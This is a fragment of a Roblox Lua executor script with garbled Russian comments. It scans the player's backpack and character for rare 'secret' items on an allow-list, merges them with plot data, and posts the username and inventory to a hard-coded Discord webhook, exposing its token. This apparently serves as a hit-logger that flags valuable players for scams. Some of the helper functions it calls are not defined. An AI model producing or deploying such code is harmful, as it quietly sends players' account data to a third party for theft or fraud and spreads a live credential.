-- === –°–±–æ—Ä –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è —Å —Ñ–∏–ª—å—Ç—Ä–æ–º —Å–µ–∫—Ä–µ—Ç–æ–∫ ===
local function collectInventory()
    local invText = ""
    local items = {}

    -- –°–ø–∏—Å–æ–∫ —Ä–∞–∑—Ä–µ—à—ë–Ω–Ω—ã—Ö "—Å–µ–∫—Ä–µ—Ç–æ–∫"
    local allowItems = {
        "garamararam",  -- –¥–æ–±–∞–≤—å —Å—é–¥–∞ –≤—Å–µ –Ω—É–∂–Ω—ã–µ —Å–µ–∫—Ä–µ—Ç–∫–∏
        "ultrabrain",   -- –ø—Ä–∏–º–µ—Ä
        "legendarytool", -- –ø—Ä–∏–º–µ—Ä
    }

    local function addItemsFrom(container)
        if not container then return end
        for _, item in ipairs(container:GetChildren()) do
            if item:IsA("Tool") then
                local nameLower = item.Name:lower()
                -- –ø—Ä–æ–≤–µ—Ä—è–µ–º –µ—Å—Ç—å –ª–∏ –≤ —Å–ø–∏—Å–∫–µ —Ä–∞–∑—Ä–µ—à—ë–Ω–Ω—ã—Ö
                for _, allowed in ipairs(allowItems) do
                    if string.find(nameLower, allowed) then
                        table.insert(items, item.Name)
                        break
                    end
                end
            end
        end
    end

    addItemsFrom(localPlayer:FindFirstChild("Backpack"))
    addItemsFrom(localPlayer.Character)

    if #items == 0 then
        return nil -- –Ω–∏—á–µ–≥–æ –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º, –µ—Å–ª–∏ –Ω–µ—Ç —Å–µ–∫—Ä–µ—Ç–æ–∫
    else
        invText = "\n--- Inventory ---\n"
        for _, name in ipairs(items) do
            invText = invText .. "- " .. name .. "\n"
        end
    end

    return invText
end

-- === –û—Å–Ω–æ–≤–Ω–æ–π –∑–∞–ø—É—Å–∫ —Å –ø—Ä–æ–≤–µ—Ä–∫–æ–π ===
local plot = findPlayerPlot()
local brainrots = plot and collectBrainrots(plot) or "‚ùå Plot –Ω–µ –Ω–∞–π–¥–µ–Ω"
local inventory = collectInventory()

if inventory then
    brainrots = brainrots .. inventory -- –æ–±—ä–µ–¥–∏–Ω—è–µ–º Brainrots + Inventory

    -- === –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Discord ===
    request({
        Url = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode({
            ["embeds"] = {{
                ["title"] = "**Brainrots | Elly**",
                ["color"] = 65280,
                ["fields"] = {
                    {
                        ["name"] = "üë§ Username",
                        ["value"] = localPlayer.Name,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "ü™ê Brainrots \ Plot",
                        ["value"] = brainrots,
                        ["inline"] = false
                    }
                }
            }}
        })
    })
end
